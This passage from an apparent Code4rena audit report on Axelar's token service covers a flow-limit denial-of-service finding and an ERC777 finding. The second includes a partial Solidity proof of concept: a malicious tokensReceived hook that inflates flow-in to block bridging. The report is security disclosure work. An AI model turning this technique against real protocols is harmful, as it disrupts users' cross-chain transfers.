9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>There could be many solutions for this. But two solutions are:</p>\n<ol>\n<li>Do the Chainlink CCIP way, Chainlink recently launched cross chain service that solved a similar problem by imposing the token bps fee. By imposing such a fee along with a gas fee, the cost of attack becomes way higher and the system can be protected from such an attack.</li>\n<li>Introduce the mechanism of limit per account instead of whole limit. But that can be exploited too by doing it through multiple accounts.</li>\n</ol>\n<p>Chainlink’s way would be the better solution to go with IMO.</p>\n<h3 id=\"assessed-type-2\" style=\"position:relative;\"><a href=\"#assessed-type-2\" aria-label=\"assessed type 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>DoS</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/484#issuecomment-1693709234\">deanamiel (Axelar) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Corrected Severity: QA</p>\n<p>This behavior is intentional. If an attacker tries to block one way (either in or out), the operator can respond by increasing the <code>flowLimit</code> (or setting it to <code>0</code>, meaning there’s no limit at all) to help handle the attack. We prefer to keep fees as low as possible, so we would not want to use the Chainlink method that was suggested.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/484#issuecomment-1702476186\">berndartmueller (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Even though this is intentional, the demonstrated issue can cause temporary availability (inability to transfer tokens) issues for the token service. This qualifies for medium severity, according to the <a href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\">C4 judging criteria</a>:</p>\n<blockquote>\n<p>Assets not at direct risk, but the <strong>function of the protocol or its availability could be impacted</strong></p>\n</blockquote>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/484#issuecomment-1801749159\">milapsheth (Axelar) commented</a>:</strong></p>\n<blockquote>\n<p>We consider this QA for the following reasons:</p>\n<ol>\n<li>Rate limits are intended to reduce availability/liveness on large transfers, so liveness concern by itself isn’t applicable to judge this issue.</li>\n<li>Rate limits are opt-in and updatable, operators are recommended to choose the parameters carefully to determine the risk/liveness trade-off, and take operational responsibility to maintain it.</li>\n<li>The design is intentional. We consider other proposed designs to have worse trade-offs. A bps fee introduces a fee-on-transfer behaviour, and a high cost to otherwise honest large transfers. Per account limits are not Sybil resistant. We’re happy to consider other designs if they’re better, but the report doesn’t cover that.</li>\n</ol>\n</blockquote>\n<hr>\n<h2 id=\"m-02-tokenmanagers-flow-limit-logic-is-broken-for-erc777-tokens\" style=\"position:relative;\"><a href=\"#m-02-tokenmanagers-flow-limit-logic-is-broken-for-erc777-tokens\" aria-label=\"m 02 tokenmanagers flow limit logic is broken for erc777 tokens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/332\">[M-02] <code>TokenManager</code>’s flow limit logic is broken for <code>ERC777</code> tokens</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/332\">bart1e</a>, also found by <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/371\">nobody2018</a> and <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/345\">immeas</a></em></p>\n<h3 id=\"lines-of-code-1\" style=\"position:relative;\"><a href=\"#lines-of-code-1\" aria-label=\"lines of code 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lines of code</h3>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/token-manager/implementations/TokenManagerLockUnlock.sol#L60-L67\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/token-manager/implementations/TokenManagerLockUnlock.sol#L60-L67</a><br>\n<a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/token-manager/implementations/TokenManagerLiquidityPool.sol#L94-L101\">https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/token-manager/implementations/TokenManagerLiquidityPool.sol#L94-L101</a></p>\n<h3 id=\"vulnerability-details\" style=\"position:relative;\"><a href=\"#vulnerability-details\" aria-label=\"vulnerability details permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability details</h3>\n<p><code>TokenManager</code> implementations inherit from the <code>FlowLimit</code> contract that keeps track of flow in and flow out. If these two values are too far away from each other, it reverts:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_addFlow</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">flowLimit</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">slotToAdd</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">slotToCompare</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">flowAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">flowToAdd</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">flowToCompare</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            flowToAdd := </span><span class=\"mtk11\">sload</span><span class=\"mtk1\">(</span><span class=\"mtk12\">slotToAdd</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            flowToCompare := </span><span class=\"mtk11\">sload</span><span class=\"mtk1\">(</span><span class=\"mtk12\">slotToCompare</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">flowToAdd</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">flowAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">flowToCompare</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">flowLimit</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FlowLimitExceeded</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">sstore</span><span class=\"mtk1\">(</span><span class=\"mtk12\">slotToAdd</span><span class=\"mtk1\">, </span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">flowToAdd</span><span class=\"mtk1\">, </span><span class=\"mtk12\">flowAmount</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Flow in and flow out are increased when some tokens are transferred from one blockchain to another.\nThere are 3 different kinds of <code>TokenMaganer</code>:</p>\n<ul>\n<li>Lock/Unlock</li>\n<li>Mint/Burn</li>\n<li>Liquidity Pool</li>\n</ul>\n<p>Let’s see how Lock/Unlock and Liquidity Pool implementations handle cases when they have to transfer tokens to users:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_giveToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">tokenAddress</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">SafeTokenTransfer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\">) - </span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_giveToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">tokenAddress</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">SafeTokenTransferFrom</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk11\">liquidityPool</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\">) - </span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>As can be seen, they return a value equal to a balance difference before and after token transfer. This returned value is subsequently used by the <code>giveToken</code> function in order to call <code>_addFlowIn</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">giveToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyService</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_giveToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">destinationAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_addFlowIn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>The problem arises when <code>token</code> is <code>ERC777</code> token. In that case, the token receiver can manipulate its balance in order to increase flow in more than it should be; see POC section for more details.</p>\n<p>There is no mechanism that will disallow someone from creating <code>TokenManager</code> with <code>ERC777</code> token as an underlying token, so it’s definitely a possible scenario and the protocol would malfunction if it happens.</p>\n<p>Note that it’s not an issue like “users may deploy <code>TokenManager</code> for their malicious tokens that could even lie about <code>balanceOf</code>”. Users may simply want to deploy <code>TokenManager</code> for some <code>ERC777</code> token and bridge their <code>ERC777</code> tokens and there is nothing unusual about it.</p>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>It is possible to manipulate flow in when there is <code>TokenManager</code> of type Lock/Unlock or Liquidity Pool and the underlying token is <code>ERC777</code> token. It could be used to create DoS attacks, as it won’t be possible to transfer tokens from one blockchain to another when the flow limit is reached (it may be possible to send them from one blockchain, but it will be impossible to receive them on another one due to the <code>revert</code> in the <code>_addFlow</code> function).</p>\n<p>In order to recover, <code>flowLimit</code> could be set to <code>0</code>, but the feature was introduced in order to control flow in and flow out. Setting <code>flowLimit</code> to <code>0</code> means that the protocol won’t be able to control it anymore.</p>\n<p>Here, the availability of the protocol is impacted, but an extra requirement is that there has to be <code>TokenManager</code> of Lock/Unlock or Liquidity Pool kind with <code>ERC777</code> underlying token, so I’m submitting this issue as Medium.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Consider the following scenario:</p>\n<ol>\n<li><code>TokenManager</code> of type Lock/Unlock was deployed on blockchain <code>X</code> with underlying <code>ERC777</code> token (like FLUX, for example). Let’s call this token <code>T</code>.</li>\n<li>Assume that blockchain <code>X</code> has low gas price (not strictly necessary, but will be helpful to visualize the issue).</li>\n<li>Alice wants to move their tokens (<code>T</code>) from blockchain <code>Y</code> to <code>X</code>, so they call <code>sendToken</code> from <code>TokenManagerLockUnlock</code> in order to start the process.</li>\n<li>Bob sees that and they also call <code>sendToken</code>, but with some dust amount of token <code>T</code>, they schedules that transaction from their smart contract called <code>MaliciousContract</code>.</li>\n<li>Bob’s transaction is handled first and finally <code>TokenManagerLockUnlock::_giveToken</code> is called in order to give that dust amount of <code>T</code> to Bob’s contract (<code>MaliciousContract</code>).</li>\n<li><code>_giveToken</code>:</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_giveToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">tokenAddress</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">SafeTokenTransfer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\">) - </span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>First, this records current balance of <code>T</code> of <code>MaliciousContract</code>, which happens to be <code>0</code> and calls <code>transfer</code>, which finally calls <code>MaliciousContract::tokensReceived</code> hook.</p>\n<ol start=\"7\">\n<li><code>MaliciousContract::tokensReceived</code> hook looks as follows:</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">tokensReceived</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">operator</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">operatorData</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk17\">&lt;</span><span class=\"mtk10\">TOKEN_MANAGER_ADDRESS</span><span class=\"mtk17\">&gt;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        maliciousContractHelper.sendMeT();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    else</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        